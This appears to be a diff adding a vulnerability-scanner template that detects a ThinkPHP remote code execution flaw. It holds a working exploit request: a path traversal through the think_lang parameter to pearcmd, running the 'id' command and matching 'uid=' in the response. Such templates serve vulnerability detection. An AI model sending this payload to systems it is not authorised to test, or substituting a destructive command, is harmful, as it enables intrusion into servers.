@@ -1,0 +1,17 @@
+id: Think_PHP-RCE
+
+info:
+  name: Think PHP < 6.0.14 RCE Found
+  author: abdulrahman
+  severity: critical
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=id"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
